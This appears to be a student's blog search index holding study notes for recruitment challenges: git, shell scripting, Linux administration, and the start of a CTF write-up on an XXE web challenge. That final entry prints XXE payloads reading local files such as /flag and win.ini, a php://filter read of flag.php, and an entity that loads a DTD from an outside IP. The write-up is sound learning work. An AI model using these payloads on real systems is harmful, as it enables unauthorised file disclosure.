https://github.com/calendar0917/learning_log.git (fetch) origin https://github.com/calendar0917/learning_log.git (push) # push 到gitee上 [root@localhost learning_log]# git push gitee main Username for \u0026#39;https://gitee.com\u0026#39;: calendar917 Password for \u0026#39;https://calendar917@gitee.com\u0026#39;: Counting objects: 10, done. ...... To https://gitee.com/calendar917/learning_log.git * [new branch] main -\u0026gt; main 标签使用 git restore（Git 2.23+ 新增）\n核心作用：恢复工作区或暂存区（index）的文件内容，不影响提交历史。可以理解为 “撤销对文件的修改”，直接操作文件内容，而非提交记录。\n保存一步： git add . git commit -m \u0026quot;描述\u0026quot;\n恢复任意状态： git log --oneline 找编号 git restore --source=编号 . git add .\n打标签： git tag 标签名 提交号\n恢复标签： git restore --source=标签名 .\n删标签： git tag -d 标签名\n","date":"2025-10-18T00:00:00Z","image":"https://raw.githubusercontent.com/calendar0917/images/master/20251021193834987.png","permalink":"https://calendar0917.github.io/posts/%E5%BE%A1%E6%9E%97-git%E7%89%88%E6%9C%AC%E7%AE%A1%E7%90%86/","title":"御林招新题：Git 版本管理"},{"content":"重定向与管道 了解标准输入、标准输出、标准错误的概念。 标准输入（Standard Input，stdin）：默认是键盘，是程序获取输入数据的地方。例如，cat命令如果没有指定文件，就会从标准输入读取内容，此时你可以在键盘上输入文字，输入结束后按Ctrl + D（类 Unix 系统）表示输入结束，cat会将输入的内容输出。 标准输出（Standard Output，stdout）：默认是终端屏幕，是程序输出正常结果的地方。比如执行ls命令，会在终端显示当前目录下的文件和文件夹列表。 标准错误（Standard Error，stderr）：默认也是终端屏幕，用于输出程序的错误信息。例如，执行ls /nonexistent（假设/nonexistent是不存在的目录），会在终端显示类似ls: cannot access '/nonexistent': No such file or directory的错误信息，这就是标准错误输出。 使用 \u0026gt; 和 \u0026gt;\u0026gt; 操作符将命令的输出重定向到文件。 \u0026gt;操作符：用于将命令的标准输出重定向到文件，如果文件已存在，会覆盖文件原有内容；如果文件不存在，会创建新文件。 \u0026gt;\u0026gt;操作符：用于将命令的标准输出以追加的方式重定向到文件，即把输出内容添加到文件原有内容的末尾，不会覆盖原有内容。 使用 2\u0026gt; 或 2\u0026gt;\u0026gt; 操作符将标准错误重定向到文件。 1 2 3 4 5 [root@localhost hello]# ls /invalid 2\u0026gt; error.txt [root@localhost hello]# ls /invalid_2 2\u0026gt;\u0026gt; error.txt [root@localhost hello]# cat error.txt ls: cannot access /invalid: No such file or directory ls: cannot access /invalid_2: No such file or directory 使用 | 管道操作符将一个命令的输出作为另一个命令的输入。 1 2 3 [root@localhost hello]# ls | grep \u0026#39;txt\u0026#39; digit_count.txt error.txt 变量与引号 学习如何在 Shell 中定义、引用和取消定义变量。 定义变量：基本语法是：变量名=值，等号两边不能有空格。\n引用变量：使用 $变量名 或者 ${变量名} 的形式。\n取消定义变量\n使用 unset 命令可以取消定义变量，语法为：unset 变量名。\n理解单引号 (')、双引号 (\u0026quot;) 和反引号 (``) 的区别与作用。 单引号（'）：用于包裹字符串，单引号内的所有内容都被视为普通字符，不会进行变量替换、命令替换等操作。\n**双引号（\u0026quot;）：**双引号内会进行变量替换和命令替换（需要结合$()或反引号）\n**反引号（`）**：反引号主要用于命令替换，即执行反引号内的命令，并将命令的输出作为结果返回。不过现在更推荐使用$()`来进行命令替换，因为它的可读性更好，而且可以嵌套使用（反引号嵌套使用比较复杂）。\n参数与条件判断 了解如何获取命令行参数（例如 $1, $2, $#）。 $1、$2、$3……：分别表示第 1 个、第 2 个、第 3 个…… 命令行参数。 $#：表示命令行参数的个数。 $0：表示脚本本身的名称。 $\\*：把所有的命令行参数当作一个整体的字符串 $@：把每个命令行参数当作独立的字符串 掌握基本的条件判断语句（if 语句）。 1 2 3 4 5 6 7 if [条件1]; then # 条件1为真时执行的命令 elif [条件2]; then # 条件2为真时执行的命令 else # 所有条件都为假时执行的命令 fi 使用 test 或 [] 进行文件、字符串或数字的比较。 test 命令和 []（方括号）在 Shell 中用于进行条件测试，可以对文件、字符串、数字等进行比较。[] 是 test 命令的另一种写法，使用起来更简洁。\n文件： -e 存在、-f 普通文件、-d 目录、-r 可读、-w 可写、-x 可执行 字符串： = 相等、！=不等、-z 长度是否为0、-n 长度是否不为零 数字： -eq 相等、-ne 不相等、-gt 大于、-ge 大于等于、-lt 小于、-le 小于等于 循环 学习 for 循环和 while 循环的基本用法。 1 2 3 4 5 6 7 for 变量 in 元素1 元素2 元素3 ...; do # 循环体，对每个元素执行的操作 done for 变量 in {起始值..结束值}; do # 循环体 done 1 2 3 while 条件; do # 循环体，条件为真时执行的操作 done 能够编写简单的循环脚本来处理文件列表或执行重复任务。 编写一个 Shell 脚本，实现以下功能： 参数检查：\n检查脚本是否接收到至少一个命令行参数。如果没有，打印使用说明（例如：Usage: ./file_processor.sh \u0026lt;directory\u0026gt;）并退出。 目录遍历：\n脚本接收一个目录路径作为参数。进入该目录后，使用 for 循环遍历目录下的所有文件。 文件处理：\n对于遍历到的每一个文件，进行以下判断：\n如果文件是普通文件（非目录），则将该文件的文件名（不包含路径）打印到标准输出。\n如果文件是可执行文件，则在文件名后面追加 (Executable) 字样。\n结果输出：\n将所有被处理的文件的输出结果（包含可执行标记）重定向到一个名为 processed_files.txt 的新文件中。\n最后，打印一句话，提示用户处理已完成，并说明结果已保存在 processed_files.txt 中。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 #!/bin/bash # 判断是否未传入任何参数 if [ -z \u0026#34;$*\u0026#34; ]; then echo \u0026#39;Usage： ./file_processor.sh \u0026lt;directory\u0026gt;\u0026#39; echo \u0026#39;是不是没有写文件路径？\u0026#39; # 判断传入的参数是否为目录 elif [ -d \u0026#34;$1\u0026#34; ]; then # 遍历目录下的所有文件 for file in \u0026#34;$1\u0026#34;/*; do # 判断是否为普通文件 if [ -f \u0026#34;$file\u0026#34; ]; then echo -n \u0026#34;$file\u0026#34; echo -n \u0026#34;$file\u0026#34; \u0026gt;\u0026gt; processed_files.txt # 判断文件是否可执行 if [ -x \u0026#34;$file\u0026#34; ]; then echo -n \u0026#39;Executable\u0026#39; echo -n \u0026#39;Executable\u0026#39; \u0026gt;\u0026gt; processed_files.txt fi fi echo \u0026#39;\u0026#39; # 美化的作用 done echo \u0026#39;批处理已完成，结果已保存在 processed_files.txt 中\u0026#39; echo \u0026#39;-----------------\u0026#39; else echo \u0026#39;是不是文件夹路径输错了？\u0026#39; fi 写错的点：\n[ -z $* ]，要先写 -\u0026lt;...\u0026gt; $file 忘记改单引号为双引号了 $1 只是目录路径，\u0026quot;$1\u0026quot;/* 才是目录下所有文件 echo 默认带换行，添加 -n 参数取消 结果如下图：\n又发现 .txt 中没有换行，得添加一下手动换行\n","date":"2025-10-18T00:00:00Z","permalink":"https://calendar0917.github.io/posts/%E5%BE%A1%E6%9E%97-shell%E5%85%A5%E9%97%A8/","title":"御林招新题：shell 入门"},{"content":"小结 ps 命令查看进程 losf、netstat 查看端口进程号 kill 终结进程 Linux 文件结构 grep + 正则 + 管道查找指定内容 wc 统计字符 自动化脚本 .sh systemctl 控制 service 终止 内核模块 lsmod 列出 modprobe 控制 btrfs 控制磁盘、分卷 mount 挂载 snapshot 创建快照、回滚 journalctl 查看、删除日志文件 sysctl 查看、修改内核参数 控制 TCP 最大连接数：net.core.somaxconn \u0026amp; net.ipv4.tcp_max_syn_backlog 系统与进程管理 特殊进程：描述进程号为 1 的特殊进程是什么，以及它在系统中的作用。 进程号为 1 的特殊进程在类 Unix 系统（如 Linux）中通常是init进程\n作用：它是系统启动后创建的第一个用户空间进程，是所有其他进程的祖先进程。负责系统初始化，比如启动各种服务、设置运行级别等，系统关闭时也由它来完成相关收尾工作，确保系统各部分有序启动和停止。 由 0 进程创建，内核启动 -\u0026gt; init启动 -\u0026gt; 启动其他进程 进程状态：使用 ps 命令查看所有活跃进程，并分析其父子关系。 1 2 3 4 5 [root@localhost ~]# ps -A -f UID PID PPID C STIME TTY TIME CMD root 1 0 0 23:25 ? 00:00:03 /usr/lib/systemd/systemd --switched-root --syste root 2 0 0 23:25 ? 00:00:00 [kthreadd] root 4 2 0 23:25 ? 00:00:00 [kworker/0:0H] PID：进程 ID\nPPID：进程的父 PID\n端口占用：当某个程序无法启动并提示端口已被占用时，如何通过命令行找出占用该端口的进程号（PID）并终止它。 查看端口进程：\nlsof（List Open Files ） netstat（Network Statistics） netstat | grep PID -t：显示 TCP 协议的连接 / 端口（Transmission Control Protocol，传输控制协议）。 -u：显示 UDP 协议的连接 / 端口（User Datagram Protocol，用户数据报协议）。 -l：仅显示 处于监听状态 的端口（即等待外部连接的端口，而非已建立的连接）。 -p：显示 占用端口的进程信息（包括进程 ID 和进程名），需要 root 权限才能完整显示。 -n：以 数字形式 显示 IP 地址和端口号（而非域名或服务名，例如直接显示 127.0.0.1:8080 而非 localhost:http-alt）。 终止：\nkill -pid PID 强制终止进程 网络与文件系统 文件系统结构：描述 Linux 文件系统（例如 ext4）的基本目录结构和作用，并解释根目录 / 和 /home 的区别。 基本目录结构：树形\n/（根目录）：最顶层目录，所有其他目录和文件都从这里开始分支，包含了系统运行所需的所有核心文件和目录，一般情况下普通用户只能读取 /home：是普通用户的主目录集合，每个普通用户在系统中都有一个以自己用户名命名的子目录（如用户 user1 的主目录是 /home/user1）。用户在自己的主目录下有完全的操作权限，可以存储个人文件、配置个人环境等，不会影响系统的核心部分。 /bin：存放系统的基本命令，这些命令是二进制可执行文件，普通用户和超级用户都可以执行，用于完成基本的系统操作，如 ls（列出目录内容）、cp（复制文件）等。 /sbin：存放系统管理命令，通常只有超级用户（root）才能执行，用于系统管理和维护，如 ifconfig（配置网络接口）、shutdown（关闭系统）等。 /etc：存放系统的配置文件，包括系统服务配置、用户配置、网络配置等，如 passwd（用户账户信息）、fstab（文件系统挂载配置）等。 /dev：存放设备文件，Linux 把所有的硬件设备都抽象为文件，通过这些文件可以访问和控制硬件设备，如 sda（第一块硬盘）、tty1（第一个终端）等。 /proc：是一个虚拟文件系统，它不占用实际的磁盘空间，而是反映系统当前的运行状态，包含了进程信息、内存使用情况等，如 /proc/cpuinfo（CPU 信息）、/proc/meminfo（内存信息）等。 /usr：存放用户安装的应用程序和文件，类似于 Windows 系统中的 “Program Files” 目录，包含了大量的应用程序、库文件、文档等。 /var：存放经常变化的文件，如日志文件（/var/log）、邮件（/var/mail）、打印队列（/var/spool）等。 /tmp：存放临时文件，系统重启后这里的文件会被清除，用于程序运行时临时存储数据。 GRUB：什么是 GRUB？它在 Linux 系统启动中扮演了什么角色？ Grand Unified Bootloader 统一引导加载程序\n系统启动引导：计算机开机后，首先由 BIOS（基本输入输出系统）或 UEFI（统一可扩展固件接口）进行硬件检测和初始化，然后会将引导加载程序（GRUB）加载到内存中运行。GRUB 负责加载 Linux 内核，并将系统控制权转交给内核，从而启动 Linux 系统。 多系统引导：如果计算机上安装了多个操作系统（如同时安装了 Linux 和 Windows），GRUB 可以提供一个启动菜单，让用户选择要启动的操作系统。 内核参数设置：在系统启动时，用户可以通过 GRUB 的启动菜单，临时修改内核的启动参数，这对于系统调试、故障排除（如单用户模式启动）等非常有用。 文件内容处理 查找模式：使用 grep 命令在 /etc/passwd 文件中，找出所有以 t 开头的文本行。 1 2 3 [root@localhost ~]# grep \u0026#39;^t\u0026#39; /etc/passwd tss:x:59:59:Account used ...... tcpdump:x:72:72::/:/sbin/nologin 管道与重定向：使用管道和重定向，将 /etc/passwd 文件中所有包含数字的行数统计出来，并重定向到一个名为 digit_count.txt 的文件中。 1 2 3 [root@localhost ~]# grep -E [0-9] /etc/passwd | wc -l \u0026gt; hello/digit_count.txt // 统计结果：44 高级系统管理 systemd：\n编写一个简单的 systemd service 文件，让一个简单的脚本（例如，一个每分钟向 /tmp/test_log.txt 文件写入当前时间的脚本）开机自启动。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 //time.sh #!/bin/bash while true; do echo \u0026#34;当前时间: $(date)\u0026#34; \u0026gt;\u0026gt; /tmp/test_log.txt sleep 60 done //service [Unit] Description=定时写入时间到日志的服务 [Service] ExecStart=/home/your_username/time_script.sh Restart=always [Install] WantedBy=multi-user.target 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 [root@localhost ~]# sudo systemctl enable time-logger.service Created symlink from /etc/systemd/system/multi-user.target.wants/time-logger.service to /etc/syste md/system/time-logger.service. [root@localhost ~]# systemctl start time-logger.service [root@localhost ~]# systemctl status time-logger.service ● time-logger.service - 定时写入时间到日志的服务 Loaded: loaded (/etc/systemd/system/time-logger.service; enabled; vendor preset: disabled) Active: active (running) since Fri 2025-10-17 00:48:53 PDT; 2s ago Main PID: 29493 (time_script.sh) Tasks: 2 Memory: 304.0K CGroup: /system.slice/time-logger.service ├─29493 /bin/bash /root/time_script.sh └─29497 sleep 60 [root@localhost ~]# cat /tmp/test_log.txt 当前时间: Fri Oct 17 00:48:53 PDT 2025 使用 systemctl 命令启用和启动你的服务，并验证它是否正常工作。 内核模块：\n列出系统中所有已加载的内核模块。 1 2 3 4 5 [root@localhost ~]# lsmod Module Size Used by nf_conntrack_netlink 36396 0 xt_addrtype 12676 2 ..... 尝试加载一个你了解的内核模块（例如，一个虚拟网络设备模块），然后卸载它，并验证其状态。 1 2 3 4 5 6 [root@localhost ~]# modprobe dummy [root@localhost ~]# lsmod | grep dummy dummy 12960 0 [root@localhost ~]# modprobe -r dummy [root@localhost ~]# lsmod | grep dummy [root@localhost ~]# 什么是 dummy？\n在 Linux 系统中，dummy模块是一种虚拟网络设备模块，主要有以下特点和用途：\n虚拟网络接口创建：加载dummy模块后，通过系统命令可以创建出像 dummy0、dummy1 这样的虚拟网络接口。这些接口和真实的物理网络接口类似， 可以配置 IP 地址、子网掩码等网络参数 ，也能参与网络数据包的收发模拟。 网络测试与实验：在进行网络相关的测试，比如路由策略测试、防火墙规则测试时，使用dummy虚拟网络接口非常方便。不需要依赖实际的物理网络设备，就可以构建复杂的网络拓扑结构，模拟各种网络环境。 服务绑定与隔离：某些应用场景下，需要将特定的网络服务绑定到指定的网络接口上，使用dummy接口可以实现灵活的绑定和隔离。比如，希望某个服务只在特定的 “网络通道” 上提供服务，就可以将该服务绑定到dummy接口上，便于管理和安全控制。 现代文件系统 Btrfs/ZFS 文件系统实践：\n创建文件系统与子卷：\n假设你有一个未使用的磁盘分区 /dev/sdb1。\n格式化该分区为 Btrfs 或 ZFS 文件系统。\n挂载该文件系统到一个新的目录，例如 /mnt/data。\n在 /mnt/data 下创建两个子卷，一个名为 web_data，另一个名为 database。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 由于没有磁盘分区，故用虚拟磁盘代替 [root@localhost ~]# dd if=/dev/zero of=~/virtual_disk.img bs=1G count=1 // 创建 1G * 1 的虚拟磁盘 [root@localhost ~]# losetup -f ~/virtual_disk.img [root@localhost ~]# losetup -a | grep virtual_disk.img /dev/loop0: [2051]:67154732 (/root/virtual_disk.img) // 自动映射,格式化 [root@localhost ~]# mkfs.btrfs /dev/loop0 btrfs-progs v4.9.1 See http://btrfs.wiki.kernel.org for more information. Performing full device TRIM /dev/loop0 (1.00GiB) ... ...... // 创建映射文件系统新目录并挂载 [root@localhost ~]# mkdir /mnt/data [root@localhost ~]# mount /dev/loop0 /mnt/data // 创建两个子卷 [root@localhost ~]# btrfs subvolume create /mnt/data/web_data Create subvolume \u0026#39;/mnt/data/web_data\u0026#39; [root@localhost ~]# btrfs subvolume create /mnt/data/database Create subvolume \u0026#39;/mnt/data/database\u0026#39; [root@localhost ~]# btrfs subvolume list /mnt/data ID 256 gen 7 top level 5 path web_data ID 257 gen 8 top level 5 path database 快照与回滚：\n在 web_data 子卷中创建一个测试文件 hello.txt。\n为 web_data 子卷创建一个只读快照，命名为 snapshot_v1。\n修改 web_data 子卷中的 hello.txt 文件内容。\n验证 snapshot_v1 中的文件内容是否保持不变。\n回滚 web_data 子卷到 snapshot_v1 的状态，并验证 hello.txt 的内容是否恢复到修改前。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 // 创建文件 [root@localhost ~]# echo \u0026#39;helloworld 111\u0026#39; \u0026gt; /mnt/data/web_data/hello.txt // 创建只读快照 [root@localhost ~]# btrfs subvolume snapshot -r /mnt/data/web_data /mnt/data/snapshot_v1 Create a readonly snapshot of \u0026#39;/mnt/data/web_data\u0026#39; in \u0026#39;/mnt/data/snapshot_v1\u0026#39; // 修改文件 [root@localhost ~]# echo \u0026#39;helloworld 222\u0026#39; \u0026gt; /mnt/data/web_data/hello.txt //读快照，并未改变 [root@localhost ~]# cat /mnt/data/snapshot_v1/hello.txt helloworld 111 // 删除源文件，快照恢复 [root@localhost ~]# btrfs subvolume delete /mnt/data/web_data Delete subvolume (no-commit): \u0026#39;/mnt/data/web_data\u0026#39; [root@localhost ~]# btrfs subvolume snapshot /mnt/data/snapshot_v1/ /mnt/data/web_data Create a snapshot of \u0026#39;/mnt/data/snapshot_v1/\u0026#39; in \u0026#39;/mnt/data/web_data\u0026#39; [root@localhost ~]# cat /mnt/data/web_data/hello.txt helloworld 111 系统优化与维护 缓存与日志管理：\n使用 journalctl 命令查看过去 10 分钟内系统日志中所有包含“error”或“fail”关键字的条目。\n通过命令行安全地清除超过 7 天的系统日志文件，以释放磁盘空间。\n1 2 3 4 5 6 7 [root@localhost ~]# journalctl --since \u0026#34;100 minute ago\u0026#34; | grep -E \u0026#34;error|fail\u0026#34; Oct 17 00:46:03 localhost.localdomain systemd[1]: Unit time-logger.service entered failed state. Oct 17 00:46:03 localhost.localdomain systemd[1]: time-logger.service failed. ...... [root@localhost ~]# journalctl --vacuum-time=7d Vacuuming done, freed 0B of archived journals on disk. 内核参数调整：\n查看当前系统中的 TCP 最大连接数限制参数。\n临时修改该参数，将最大连接数限制提高到 50000。\n使用 sysctl -a 命令验证修改是否生效。\n1 2 3 4 5 6 7 8 9 10 [root@localhost ~]# sysctl net.core.somaxconn net.ipv4.tcp_max_syn_backlog net.core.somaxconn = 128 net.ipv4.tcp_max_syn_backlog = 256 [root@localhost ~]# sysctl -w net.core.somaxconn=50000 net.core.somaxconn = 50000 [root@localhost ~]# sysctl -a | grep -E \u0026#34;50000\u0026#34; ...... net.core.somaxconn = 50000 ...... 解释此项修改对一个高并发 Web 服务器可能带来的影响。 提高 TCP 最大连接数限制（如 net.core.somaxconn 和 net.ipv4.tcp_max_syn_backlog），对高并发 Web 服务器有以下影响：\n优化： 能够处理更多的并发 TCP 连接请求，减少因连接队列满而导致的连接建立失败情况，提升 Web 服务器的并发处理能力，让更多客户端能成功与服务器建立连接并请求资源。 问题： 会增加服务器的内存等资源消耗，因为每个连接都需要一定的内存来维护连接状态等信息。如果服务器内存等资源不足，过度提高连接数限制可能导致系统内存紧张，甚至出现内存溢出等问题，反而影响服务器的稳定运行。 ","date":"2025-10-17T00:00:00Z","permalink":"https://calendar0917.github.io/posts/%E5%BE%A1%E6%9E%97-linux%E8%BF%9B%E9%98%B6/","title":"御林招新题：Linux 进阶"},{"content":"获得一个Linux操作系统 服务器 + 云服务器均尝试，已完成。\n命令基础 登录Linux系统，更改自己的用户口令 1 2 3 4 5 [root@localhost ~]# passwd Changing password for user root. New password: Retype new password: passwd: all authentication tokens updated successfully. 执行常用的Linux命令 1 2 3 4 5 [root@localhost ~]# ls anaconda-ks.cfg original-ks.cfg [root@localhost ~]# mkdir hello [root@localhost ~]# cd .. ... 使用 man 命令，来查找特定命令的帮助信息 。 man ls 文件与目录 显示和改变当前目录 。 1 2 3 [root@localhost /]# pwd / [root@localhost /]# cd home 使用 ls 命令的不同选项来查看文件与目录的属性 。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 [root@localhost /]# ls -l total 24 lrwxrwxrwx. 1 root root 7 Sep 28 08:05 bin -\u0026gt; usr/bin dr-xr-xr-x. 5 root root 4096 Sep 28 16:34 boot drwxr-xr-x. 19 root root 3260 Oct 16 03:17 dev ...... [root@localhost /]# ls -lh total 24K lrwxrwxrwx. 1 root root 7 Sep 28 08:05 bin -\u0026gt; usr/bin dr-xr-xr-x. 5 root root 4.0K Sep 28 16:34 boot drwxr-xr-x. 19 root root 3.2K Oct 16 03:17 dev ...... [root@localhost /]# ls -t root etc tmp run dev sys proc opt boot ... [root@localhost /]# ls -a . bin dev home lib64 mnt proc run srv tmp var .. boot etc lib media opt root sbin sys usr 创建和删除目录 。 1 2 [root@localhost /]# mkdir test [root@localhost /]# rmdir test 创建零长度的文件 。\ntouch test.txt 拷贝、移动、重命名、链接及删除文件 。\n1 2 3 4 5 6 7 8 9 10 11 12 13 [root@localhost /]# mkdir test [root@localhost /]# rmdir test [root@localhost /]# touch test.txt [root@localhost /]# cp test.txt test_cp.txt [root@localhost /]# mv test.txt text_rename.txt [root@localhost /]# ln test_cp.txt test_cp_hardlink.txt [root@localhost /]# ln -s test_cp test_cp_hardlink.txt test_cp.txt [root@localhost /]# ln -s test_rename_softlink.txt [root@localhost /]# rm test* rm: remove regular empty file ‘test_cp_hardlink.txt’? y rm: remove regular empty file ‘test_cp.txt’? y rm: remove symbolic link ‘test_rename_softlink.txt’? y 软链接：适合需要跨分区或对目录建立快捷方式的场景。 硬链接：适合在同一分区内共享文件内容且不希望因删除源文件而失效的场景。 查看文件内容 。 1 2 [root@localhost /]# cat bin cat: bin: Is a directory 修改文件和目录权限 使用长列表命令来查看文件与目录的信息 1 2 3 4 5 6 7 [root@localhost test]# mkdir test1 [root@localhost test]# touch test.txt [root@localhost test]# echo \u0026#34;hello\u0026#34; \u0026gt;\u0026gt; test.txt [root@localhost test]# ls -l total 4 drwxr-xr-x. 2 root root 6 Oct 16 03:43 test1 -rw-r--r--. 1 root root 6 Oct 16 03:44 test.txt -rw-r--r-- ,共 10 个字符：\n第 1 位：文件类型（- 普通文件，d 目录，l 链接）\n第 2-4 位：所有者（User）权限\n第 5-7 位：所属组（Group）权限\n第 8-10 位：其他用户（Others）权限\n权限字符：\nr (Read)：读取权限（4） w (Write)：写入权限（2） x (Execute)：执行权限（1） -：无对应权限（0） 对普通文件与目录的权限进行操作 格式：chmod [用户][操作][权限] 文件名\n用户：u(所有者)、g(所属组)、o(其他)、a(所有) 操作：+(添加)、-(移除)、=(设置) 1 2 3 4 [root@localhost test]# ls -l total 4 drwxr-xr-x. 2 root root 6 Oct 16 03:43 test1 -r--r--r--. 1 root root 6 Oct 16 03:44 test.txt vi 编辑器 创建一个文件 。vi filename\n保存并退出一个文件及不保存退出一个文件 。\n命令模式下，:wq 保存退出，:q! 直接退出\n在文本中使用不同的键进行光标的移动 。 上下左右：kjhl\n单词：w 移动到下一个单词开头；b 移动到上一个单词开头\n行首 ^，行尾 $\n文首 gg ,文尾 G\n在一个文件中加入、删除与修改文本 。 新增 光标前：i 行首I\n光标后：a 行尾A\n下一行：o 上一行O\n删除 所在字符：nx\n所在行：ndd\n到行首 d^ 到行尾 d$\n修改 当前字符：r\n到行尾：R\n设定选项以自定义编辑环境 。 :set number 设置行号\n调用命令行编辑功能 。 :!command 执行\n替换：:%s/old/new/g（old 为要替换的旧内容，new 为新内容，% 表示整个文件，g 表示全局替换）\n查找：/pattern，n下一个，N上一个\n文件操作进阶 通配符应用：在 /usr/bin 目录下，使用通配符查找所有以字母 a 开头的文件名，并仅列出文件名。 1 2 3 4 [root@localhost bin]# ls a* a2p abrt-merge-pstoreoops appstream-compose abrt-action-analyze-backtrace abrt-retrace-client appstream-util ... 查找文件：在 /tmp 目录中找到所有文件名。 1 2 [root@localhost bin]# find /tmp -type f -printf \u0026#34;%f\\n\u0026#34; .X0-lock 文件内容排序：将 /etc/passwd 文件中的内容按字母顺序和逆序分别显示。 1 2 3 4 5 6 7 8 [root@localhost tmp]# sort /etc/passwd abrt:x:173:173::/etc/abrt:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin ... [root@localhost tmp]# sort -r /etc/passwd usbmuxd:x:113:113:usbmuxd user:/:/sbin/nologin unbound:x:991:986:Unbound DNS resolver:/etc/unbound:/sbin/nologin ... 头部和尾部显示：显示 /etc/passwd 文件的前5行和后10行的内容。 1 2 3 4 5 6 7 8 9 [root@localhost tmp]# head -n 5 /etc/passwd root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin [root@localhost tmp]# tail -n 10 /etc/passwd ...... 文件权限进阶 软链接与硬链接：在你的用户主目录下，为 /usr/bin/cat 文件分别创建软链接和硬链接，并解释两者的区别。 见上\n权限恢复：如何将某个目录的权限恢复到默认的 rwxr-xr-x 形式？请使用两种不同的 chmod 语法来实现。 1 2 [root@localhost test]# chmod u=rwx,g=rx,o=rx test1 [root@localhost test]# chmod 755 test1 r-4 ; w-2 ; x-1\nvi 编辑器进阶 复制与粘贴：在 vi 中，一次性将一段文本（例如三行）复制到文件的末尾。 命令行 nyy 复制n行\n命令行 p 粘贴\n撤销与重做：掌握在 vi 中撤销（undo）和重做（redo）操作的方法。 撤销：u\n重做：ctrl+r\n","date":"2025-10-16T00:00:00Z","permalink":"https://calendar0917.github.io/posts/%E5%BE%A1%E6%9E%97-linux%E5%85%A5%E9%97%A8/","title":"御林招新题：DevOps-Linux入门"},{"content":"题干 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;header\u0026gt; \u0026lt;h1\u0026gt;\u0026lt;img src=\u0026#34;...\u0026#34; alt=\u0026#34;雪王Logo\u0026#34; class=\u0026#34;logo\u0026#34;\u0026gt;雪王生擒明珠塔\u0026lt;/h1\u0026gt; \u0026lt;p class=\u0026#34;mission\u0026#34;\u0026gt;帮助雪王，向东方明珠塔的护盾发送特殊信号，找到藏在塔内的旗帜/flag。\u0026lt;/p\u0026gt; \u0026lt;/header\u0026gt; \u0026lt;main\u0026gt; \u0026lt;div class=\u0026#34;input-area\u0026#34;\u0026gt; \u0026lt;label for=\u0026#34;payloadInput” class=\u0026#34;input-label\u0026#34;\u0026gt;在此进行你的攻击：\u0026lt;/label\u0026gt; \u0026lt;textarea id=\u0026#34;payloadInput\u0026#34; rows=\u0026#34;12\u0026#34; placeholder=\u0026#34;Enter your payload here...\u0026#34;\u0026gt;\u0026lt;/textarea\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;button onclick=\u0026#34;submitProposal()\u0026#34; class=\u0026#34;attack-button\u0026#34;\u0026gt;发起总攻\u0026lt;/button\u0026gt; \u0026lt;div id=\u0026#34;response-message” class=\u0026#34;response-area\u0026#34;\u0026gt;等待指令...\u0026lt;/div\u0026gt; \u0026lt;/main\u0026gt; \u0026lt;footer\u0026gt; \u0026lt;p\u0026gt;雪王安全实验室 \u0026amp;copy；2025\u0026lt;/p\u0026gt; \u0026lt;/footer\u0026gt; \u0026lt;/div\u0026gt; 在输入框中攻击？ 尝试 抓包如图：\n了解到可能是 xxe 漏洞\nXML 的知识 基本结构：\n1 2 3 4 5 6 7 8 9 10 \u0026lt;!--XML声明--\u0026gt; \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!--DTD，这部分可选的--\u0026gt; \u0026lt;!DOCTYPE foo [ \u0026lt;!ELEMENT foo ANY \u0026gt; \u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///c:/windows/win.ini\u0026#34; \u0026gt; ]\u0026gt; \u0026lt;!--文档元素--\u0026gt; \u0026lt;foo\u0026gt;\u0026amp;xxe;\u0026lt;/foo\u0026gt; DTD 外部（.dtd 文件）和内部 DTD\n声明方式如下：\n内部实体 1 2 3 4 5 \u0026lt;!DOCTYPE note [ \u0026lt;!ENTITY a \u0026#34;admin\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;note\u0026gt;\u0026amp;a\u0026lt;/note\u0026gt; \u0026lt;!-- admin --\u0026gt; 参数实体 1 2 3 4 5 \u0026lt;!DOCTYPE note\u0026gt; [ \u0026lt;!ENTITY % b \u0026#34;\u0026lt;!ENTITY b1 \u0026#34;awsl\u0026#34;\u0026gt;\u0026#34;\u0026gt; %b; ]\u0026gt; \u0026lt;note\u0026gt;\u0026amp;b1\u0026lt;/note\u0026gt; 外部实体 1 2 3 4 \u0026lt;!DOCTYPE note\u0026gt; [ \u0026lt;!ENTITY c SYSTEM \u0026#34;php://filter/read=convert.base64-encode/resource=flag.php\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;note\u0026gt;\u0026amp;c\u0026lt;/note\u0026gt; 支持http，file等协议，不同的语言支持的协议不同\n外部参数实体 1 2 3 4 5 \u0026lt;!DOCTYPE note\u0026gt; [ \u0026lt;!ENTITY % d SYSTEM \u0026#34;http://47.106.143.26/xml.dtd\u0026#34;\u0026gt; %d; ]\u0026gt; \u0026lt;note\u0026gt;\u0026amp;d1\u0026lt;/note\u0026gt; 1 2 \u0026lt;!-- http://47.106.143.26/xml.dtd --\u0026gt; \u0026lt;!ENTITY d1 SYSTEM \u0026#34;data://text/plain;base64,Y2w0eV9uZWVkX2FfZ3JpbGZyaWVuZA==\u0026#34;\u0026gt; 继续题目 尝试直接引入外部实体： 1 2 3 4 5 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; ?\u0026gt; \u0026lt;!DOCTYPE foo [ \u0026lt;!ENTITY rabbit SYSTEM \u0026#34;file:///flag\u0026#34; \u0026gt; ]\u0026gt; 